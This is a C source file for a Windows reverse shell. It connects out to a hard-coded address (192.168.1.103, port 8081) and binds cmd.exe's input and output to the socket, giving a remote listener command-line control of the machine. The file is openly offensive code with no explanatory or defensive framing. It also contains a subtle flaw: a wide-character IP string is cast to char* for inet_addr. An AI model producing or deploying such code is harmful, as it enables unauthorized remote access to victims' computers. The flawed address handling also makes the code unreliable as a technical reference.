#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>

int main() {
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    
    char RecvServer[512];
    int connection;
    wchar_t ip_addr[] = L"192.168.1.103";
    int port = 8081;

    // Initializing WinSock 
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // Create a TCP Socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); 

    // Specify details for sockaddr_in
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr((char*)ip_addr);

    // Connect to the target server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR) {
        printf("[!] Connection to the target server failed, please try again!\n");
        exit(0);
    } else {
        // receiving data from server
        recv(shell, RecvServer, sizeof(RecvServer), 0); 
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        
        // Pipe std input/output/err to the socket
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;
        
        // Spawn Command Prompt
        wchar_t command[] = L"cmd.exe";
        CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer, 0, sizeof(RecvServer));
    }
}
